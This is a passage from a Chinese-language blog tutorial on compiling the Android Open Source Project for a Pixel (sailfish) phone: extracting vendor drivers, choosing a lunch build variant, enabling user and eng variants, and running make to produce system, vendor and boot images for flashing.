<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line"><span class="built_in">chmod</span> 777 ./extract-google_devices-sailfish.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 ./extract-qcom-sailfish.sh</span><br><span class="line">./extract-google_devices-sailfish.sh <span class="comment"># 注意要输入 I ACCEPT</span></span><br><span class="line">./extract-qcom-sailfish.sh <span class="comment"># 注意要输入 I ACCEPT</span></span><br><span class="line"><span class="comment"># 执行完后就可以将这文件删除</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215136359.png" alt="Image"></p>
<p>上述步骤操作完成后，<strong>需要查看一下源码中有没手机对应的设备内核。</strong></p>
<p>内核存放位置参考: <a target="_blank" rel="noopener" href="https://source.android.google.cn/setup/build/building-kernels#id-version">https://source.android.google.cn/setup/build/building-kernels#id-version</a></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215147875.png" alt="Image"></p>
<p><strong>如果没有对应的内核，则按照文档中的步骤进行构建内核，一般都会有的！</strong></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215152551.png" alt="Image"></p>
<h2 id="进行编译"><a href="#进行编译" class="headerlink" title="进行编译"></a>进行编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line">make clobber <span class="comment"># 清理，一套Android源码可以编译不同的机型，想要更换机形，需要执行该清理动作。</span></span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh <span class="comment"># 执行配置一些环境遍历，下边的命令想要使用就要通过这个脚本进行环境变量配置。</span></span><br><span class="line">lunch <span class="comment"># 选择需要编译的设备内核和编译版本</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>版本类型</p>
</li>
<li><ul>
<li>xxx-user 没有root权限。</li>
<li>xxx-userdebug adbd有root权限，需要手动su。</li>
<li>xxx-eng adbd完全root权限。</li>
</ul>
</li>
<li><p>手机代号</p>
</li>
<li><ul>
<li>sailfish 指的就是 Pixel 手机</li>
<li>可在 <a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a> 上进行查询</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">You<span class="string">&#x27;re building on Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Lunch menu... pick a combo:</span></span><br><span class="line"><span class="string">     1. aosp_arm-eng</span></span><br><span class="line"><span class="string">     2. aosp_arm64-eng</span></span><br><span class="line"><span class="string">     3. aosp_blueline-userdebug</span></span><br><span class="line"><span class="string">     4. aosp_bonito-userdebug</span></span><br><span class="line"><span class="string">     5. aosp_car_arm-userdebug</span></span><br><span class="line"><span class="string">     6. aosp_car_arm64-userdebug</span></span><br><span class="line"><span class="string">     7. aosp_car_x86-userdebug</span></span><br><span class="line"><span class="string">     8. aosp_car_x86_64-userdebug</span></span><br><span class="line"><span class="string">     9. aosp_cf_arm64_phone-userdebug</span></span><br><span class="line"><span class="string">     10. aosp_cf_x86_64_phone-userdebug</span></span><br><span class="line"><span class="string">     11. aosp_cf_x86_auto-userdebug</span></span><br><span class="line"><span class="string">     12. aosp_cf_x86_phone-userdebug</span></span><br><span class="line"><span class="string">     13. aosp_cf_x86_tv-userdebug</span></span><br><span class="line"><span class="string">     14. aosp_crosshatch-userdebug</span></span><br><span class="line"><span class="string">     15. aosp_marlin-userdebug</span></span><br><span class="line"><span class="string">     16. aosp_sailfish-userdebug</span></span><br><span class="line"><span class="string">     17. aosp_sargo-userdebug</span></span><br><span class="line"><span class="string">     18. aosp_taimen-userdebug</span></span><br><span class="line"><span class="string">     19. aosp_walleye-userdebug</span></span><br><span class="line"><span class="string">     20. aosp_walleye_test-userdebug</span></span><br><span class="line"><span class="string">     21. aosp_x86-eng</span></span><br><span class="line"><span class="string">     22. aosp_x86_64-eng</span></span><br><span class="line"><span class="string">     23. beagle_x15-userdebug</span></span><br><span class="line"><span class="string">     24. fuchsia_arm64-eng</span></span><br><span class="line"><span class="string">     25. fuchsia_x86_64-eng</span></span><br><span class="line"><span class="string">     26. hikey-userdebug</span></span><br><span class="line"><span class="string">     27. hikey64_only-userdebug</span></span><br><span class="line"><span class="string">     28. hikey960-userdebug</span></span><br><span class="line"><span class="string">     29. hikey960_tv-userdebug</span></span><br><span class="line"><span class="string">     30. hikey_tv-userdebug</span></span><br><span class="line"><span class="string">     31. m_e_arm-userdebug</span></span><br><span class="line"><span class="string">     32. mini_emulator_arm64-userdebug</span></span><br><span class="line"><span class="string">     33. mini_emulator_x86-userdebug</span></span><br><span class="line"><span class="string">     34. mini_emulator_x86_64-userdebug</span></span><br><span class="line"><span class="string">     35. poplar-eng</span></span><br><span class="line"><span class="string">     36. poplar-user</span></span><br><span class="line"><span class="string">     37. poplar-userdebug</span></span><br><span class="line"><span class="string">     38. qemu_trusty_arm64-userdebug</span></span><br><span class="line"><span class="string">     39. uml-userdebug</span></span><br><span class="line"><span class="string">这里sailfish没有显示user和eng版本，需要手动开启。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd ~/bin/aosp/</span></span><br><span class="line"><span class="string">nano device/google/marlin/AndroidProducts.mk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 在下边配置汇总增加user和eng</span></span><br><span class="line"><span class="string">COMMON_LUNCH_CHOICES := \</span></span><br><span class="line"><span class="string">        aosp_marlin-userdebug \</span></span><br><span class="line"><span class="string">        aosp_marlin-user \</span></span><br><span class="line"><span class="string">        aosp_marlin-end \</span></span><br><span class="line"><span class="string">        aosp_sailfish-userdebug \</span></span><br><span class="line"><span class="string">        aosp_sailfish-user \</span></span><br><span class="line"><span class="string">        aosp_sailfish-end</span></span><br></pre></td></tr></table></figure>

<p>之后再次运行如下操作，进行编译。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch <span class="comment"># 输入要编译的版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215230347.png" alt="Image"></p>
<p>进行编译，这里的 <code>-j</code>指的是要分配多少个CPU核心处理编译这个任务，<strong>注意不要乱填，根据实际情况来填写，不然编译到后边会报错。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215248243.png" alt="Image"></p>
<p>编译完成后会生成几个对应的镜像文件**~&#x2F;bin&#x2F;aosp&#x2F;out&#x2F;target&#x2F;product&#x2F;手机代号&#x2F;**文件夹下</p>
<ul>
<li>vendor.img</li>
<li>system_other.img</li>
<li>system.img</li>
<li>boot.img</li>
</ul>
<p>将这些文件copy出来，用来进行刷机用。</p>

      
	</div>

<div class="meta">
	
</div>
</article>



    </div>
    <footer id="footer">
    <div style="display:inline">
    Copyright &copy; 2022

    Mask安全小组

</div>


    </footer>
    <script src="/javascripts/fabric.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script>
 <!-- Delete or comment this line to disable Fancybox -->



<!-- end toload --> 
</div>
</div>
<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
<script type="text/javascript">
/*<![CDATA[*/
;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
/*]]>*/
</script><!-- remove it to remove the scroll to top button -->
</body>
</html>
